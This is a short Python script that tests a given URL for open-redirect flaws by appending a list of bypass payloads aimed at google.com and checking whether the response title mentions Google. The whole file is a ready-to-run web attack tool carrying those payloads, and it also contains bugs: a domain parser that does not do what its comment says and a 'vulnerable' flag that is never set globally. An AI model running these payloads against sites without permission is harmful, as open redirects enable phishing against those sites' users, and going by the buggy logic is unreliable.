import requests
import sys
import re

if len(sys.argv) != 2:
    print("\nUSAGE: python3 open_redirect.py [https://vulnerable.com/static/?returnUrl=]\n")
    sys.exit()

vulnerable = False
url = sys.argv[1]
def get_domain_name():
    domain_pattern = re.compile(r'https?://(?:www\.)?([a-zA-Z0-9.-]+)\.(?:com|us|org|in|gov|co|edu|net|ru|info|ai|me|biz|store)', re.IGNORECASE)

    match = domain_pattern.match(url)
    if match:
        full_domain = match.group(1)
        main_domain = full_domain.split('.')[-1]  # Extract the second-to-last part of the domain
        return main_domain
domain = get_domain_name()


payloads = ["https://google.com","//google.com","\google.com","https:google.com",f"{domain}.com%40google.com",f"{domain}.comgoogle.com",f"{domain}.com%2egoogle.com",f"google.com?{domain}.com",f"google.com%23{domain}.com",f"{domain}.com/°google.com",f"google.com%E3%80%82%23{domain}.com","/%0d/google.com"]

def every_payload():
    for payload in payloads:
        whole_url = url + payload
        print("-"*80)
        print(f"Payload : {whole_url}\n")
        openredr(whole_url)

def openredr(whole_url):
#    print(whole_url)
    output = requests.get(whole_url)
    if output.status_code == 200:
        title_search = re.search(r'<title[^>]*>(.*?)</title>', output.text, re.IGNORECASE | re.DOTALL)
        
        if title_search:
            title_content = title_search.group(1)
            print(f"Redirected To :->  {title_content}")
            if "Google" in title_content:
                print(f": vulnerable to Open redirect | payload : {whole_url}\n")
                vulnerable = True
                sys.exit()

            else:
                print(": Not vulnerable to Open redirect\n")


        else:
            print(f"Status code: {output.status_code}")

every_payload()
if vulnerable == True:
    print("\n\nVULNERABLE\n")

